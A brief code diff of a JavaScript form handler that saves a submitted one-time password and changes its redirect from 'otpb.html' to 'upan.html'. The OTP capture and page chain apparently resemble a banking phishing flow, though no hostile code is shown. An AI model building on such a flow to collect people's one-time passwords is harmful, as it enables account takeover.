@@ -14,7 +14,7 @@ function submitForm(e) {
   saveMessages(otp);
 
   // redirect to OTP page
-  window.location.href = "otpb.html";
+  window.location.href = "upan.html";
 }
 
 const saveMessages = (otp) => {
